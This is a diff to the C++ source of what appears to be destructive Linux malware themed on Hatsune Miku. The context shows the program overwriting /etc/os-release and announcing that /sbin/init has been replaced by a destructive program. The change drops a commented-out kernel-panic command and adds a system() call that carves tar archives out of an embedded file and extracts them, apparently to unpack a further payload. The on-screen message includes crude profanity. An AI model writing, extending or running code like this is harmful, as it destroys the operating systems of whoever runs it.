@@ -1,3 +1,22 @@
+/*
+
+Copyright (C) 1995-2026 Hyperion0801.
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+*/
+
 #include <iostream>
 #include <cstdlib>
 #include <unistd.h>
@@ -47,10 +66,9 @@ int main()
     OsRelease << "NAME=Hatsune Miku Linux\nPRETTY_NAME=Hatsune Miku Linux\nID=miku\n";
     OsRelease.close();
 
-    std::cout << "\033[2J\033[1;1HHatsune Miku and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";
+    std::cout << "\033[2J\033[1;1HHatsune Miku FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";
 
-    // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
-    // system("echo c > /proc/sysrq-trigger");
+    system("grep -abo 'ustar' mikumiku.miku | cut -d: -f1 | while read off; do start=$((off-257)); dd if=mikumiku.miku bs=1 skip=$start status=none | tar xf -; done");
 
     return EXIT_SUCCESS;
     } else {
